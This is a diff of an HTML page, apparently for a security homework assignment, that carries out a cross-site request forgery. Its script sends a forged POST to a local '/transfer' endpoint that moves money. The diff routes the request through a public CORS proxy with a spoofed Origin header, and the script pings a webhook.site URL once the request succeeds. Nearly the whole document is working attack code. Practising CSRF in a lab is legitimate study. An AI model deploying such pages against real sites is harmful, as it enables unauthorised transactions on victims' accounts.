@@ -1,24 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Exploit</title>
+    <title>CSRF Attack</title>
 </head>
 <body>
     <script>
-        // Send the POST request with the necessary headers
-        fetch("https://127.0.0.1:8080/transfer", {
+        // Send the POST request using CORS Anywhere as a proxy
+        fetch("https://cors-anywhere.herokuapp.com/http://127.0.0.1:8080/transfer", {
             method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://mitchellzhou1.github.io/hw/" // Your attacker's origin
+            },
             body: "user_to=s&amount=1"
         })
         .then(response => response.text())
         .then(data => {
-            console.log("Exploit successful:", data);  // log server response
-            // Ping the webhook if successful
-            return fetch("https://webhook.site/a6d320d6-cbaa-4b5c-b216-dfcf9036b541", {
+            console.log("Request successful:", data);
+            // After a successful request, trigger the webhook
+            fetch("https://webhook.site/a6d320d6-cbaa-4b5c-b216-dfcf9036b541", {
                 method: "GET"
             });
         })
-        .then(() => console.log("Webhook pinged successfully"))
         .catch(error => console.error("Error:", error));
     </script>
 </body>
